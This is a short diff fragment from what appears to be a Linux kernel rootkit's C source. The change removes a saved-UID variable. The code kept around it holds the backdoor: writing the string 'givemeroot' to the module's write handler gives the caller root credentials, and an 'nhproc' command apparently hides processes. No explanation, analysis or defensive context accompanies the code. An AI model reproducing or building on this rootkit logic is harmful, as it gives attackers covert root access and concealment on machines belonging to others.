@@ -11,7 +11,6 @@
 #define MAX_PIDS 50
 
 char name[] = "";
-kuid_t orig_uid;
 
 //static filldir_t proc_filldir_orig;
 static filldir_t fs_filldir_orig;
@@ -110,7 +109,6 @@ static ssize_t rk_write(struct file *file, const char __user *buffer,
 {
     if(!strncmp(buffer, "givemeroot", MIN(10, count)))
     {
-        orig_uid = current_uid();
         return commit_creds(prepare_kernel_cred(0));
     }
     else if(!strncmp(buffer, "nhproc", MIN(6, count)))
